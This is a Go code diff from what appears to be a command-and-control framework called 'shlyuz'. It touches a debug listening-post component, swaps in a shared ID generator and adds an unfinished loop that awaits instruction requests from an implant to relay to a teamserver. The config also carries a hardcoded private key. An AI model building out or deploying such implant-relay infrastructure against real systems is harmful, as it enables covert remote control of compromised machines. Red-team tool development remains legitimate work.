@@ -2,8 +2,8 @@ package main
 
 import (
 	"log"
-	"math/rand"
 	"sync"
+	"time"
 
 	// "shlyuz/pkg/crypto/asymmetric"
 	"shlyuz/internal/debugLp/pkg/transport"
@@ -11,18 +11,10 @@ import (
 	"shlyuz/internal/debugLp/pkg/component"
 	"shlyuz/internal/debugLp/pkg/config"
 	"shlyuz/internal/debugLp/pkg/transaction"
+	"shlyuz/pkg/utils/idgen"
 	"shlyuz/pkg/utils/logging"
 	"shlyuz/pkg/utils/uname"
 )
-
-func generateRandomLPId() string {
-	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
-	b := make([]rune, 32)
-	for i := range b {
-		b[i] = letters[rand.Intn(len(letters))]
-	}
-	return string(b)
-}
 
 func makeManifest(componentId string) component.ComponentManifest {
 	var generatedManifest component.ComponentManifest
@@ -55,7 +47,7 @@ func main() {
 	// TODO: make this real
 	lpConfig :=
 		[]byte(`[lp]
-id = ` + generateRandomLPId() + `
+id = ` + idgen.GenerateComponentId() + `
 transport_name = file_transport
 task_check_time = 60
 init_signature = b'\xde\xad\xf0\r'
@@ -82,4 +74,19 @@ priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
 	transaction.RelayInitFrame(&Component, initAckInstruction, transport)
 	// TODO: Register the client here
 	log.Println(client)
+
+	// TODO: Implement loop here to do the actual stuff
+	//  as an LP, we are awaiting a request for a command from an implant, which is then relayed to TS, where we get a command etc
+	for {
+		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(&Component, &client)
+		if err != nil {
+			log.Println("invalid instruction received: ")
+			log.Println("[dbginstructframe]: ", instructionRequestFrame)
+			log.Println(err)
+			time.Sleep(time.Duration(Component.Config.TskChkTimer))
+			break
+		}
+		// serverCmd := transaction.RelayInstructionToServer
+
+	}
 }
